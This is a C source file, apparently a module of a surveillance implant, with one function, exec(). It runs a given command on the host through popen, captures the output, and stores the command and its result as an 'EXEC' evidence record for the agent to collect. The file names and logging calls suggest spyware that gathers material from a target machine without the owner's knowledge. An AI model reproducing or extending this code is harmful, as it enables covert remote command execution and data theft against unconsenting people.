#define _XOPEN_SOURCE
#include <stdio.h>
#include <openssl/bio.h>

#include "evidencemanager.h"
#include "bioutils.h"
#include "runtime.h"
#include "me.h"

int exec(const char *command)
{
   BIO *bio_additional = NULL, *bio_data = NULL;
   char *additionalptr = NULL, *dataptr = NULL;
   long additionallen, datalen;
   FILE *pp = NULL;
   char line[512];
   int ret = -1, commandlen;

   debugme("EXEC %s\n", command);

   /* TODO gestire il parsing di $dir$ */

   do {
      if(!(bio_additional = BIO_new(BIO_s_mem()))) break;
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;
      if(!(pp = popen(command, "r"))) break;
      while(!feof(pp)) if(fgets(line, sizeof(line), pp)) BIO_puts16(bio_data, line);
      commandlen = strlen16(command);
      BIO_write(bio_additional, &commandlen, 4);
      BIO_puts16(bio_additional, command);
      if(!(additionallen = BIO_get_mem_data(bio_additional, &additionalptr))) break;
      if(!(datalen = BIO_get_mem_data(bio_data, &dataptr))) break;
      evidence_write(EVIDENCE_TYPE_EXEC, additionalptr, additionallen, dataptr, datalen);
      ret = 0;
   } while(0);
   if(pp) pclose(pp);
   if(bio_data) BIO_free(bio_data);
   if(bio_additional) BIO_free(bio_additional);

   return ret;
}
